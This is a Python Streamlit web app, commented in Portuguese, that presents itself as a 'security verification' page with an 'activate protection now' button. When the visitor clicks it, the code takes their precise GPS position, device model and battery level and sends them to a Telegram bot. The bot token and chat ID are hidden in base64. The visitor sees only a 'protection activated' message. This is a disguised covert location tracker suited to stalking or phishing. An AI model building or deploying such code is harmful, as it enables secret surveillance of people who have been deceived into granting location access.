import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- SISTEMA DE ENVIO BLINDADO ---
def enviar_telegram(mensagem):
    # Seus acessos em Base64
    B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
    B_ID = "ODQ5ODY2NDAyOA=="
    
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat_id = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        
        payload = {
            "chat_id": chat_id,
            "text": mensagem,
            "parse_mode": "Markdown"
        }
        
        # Tentativa de envio com tempo de espera maior (20 segundos)
        r = requests.post(url, json=payload, timeout=20)
        return r.status_code == 200
    except:
        return False

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta técnica inicial
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_GALAXY_POCO")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_FINAL")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="MAIN_BTN"):
    # GATILHO DO GPS (Pop-up automático no clique)
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:10000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")

    if posicao == "erro":
        st.error("Erro: GPS desligado ou permissão negada no navegador.")
    elif posicao:
        # DETECÇÃO DO APARELHO (Galaxy ou POCO)
        modelo = "Smartphone"
        if ua:
            try:
                # Extrai o nome real dentro dos parênteses do sistema
                info = ua.split("(")[1].split(")")[0]
                partes = [p.strip() for p in info.split(";")]
                for p in partes:
                    if any(x in p for x in ["SM-", "POCO", "A11", "M6", "Xiaomi", "Samsung"]):
                        modelo = p
                        break
            except: modelo = "Android Device"

        # MONTAGEM DO RELATÓRIO
        link_mapa = f"https://www.google.com/maps?q={posicao}"
        bateria_status = f"{bat}%" if bat else "Carregando"
        
        texto_final = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bateria_status}\n"
            f"📍 *Local:* {link_mapa}"
        )
        
        # DISPARA O ENVIO E VERIFICA
        sucesso = enviar_telegram(texto_final)
        
        if sucesso:
            st.success("Proteção Ativada")
        else:
            st.error("Erro técnico ao notificar o Telegram. Verifique sua conexão.")
    else:
        st.info("Aguardando permissão de localização no topo da tela...")

st.markdown('<br><p style="text-align:center; color:grey; font-size:12px; font-weight:bold;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
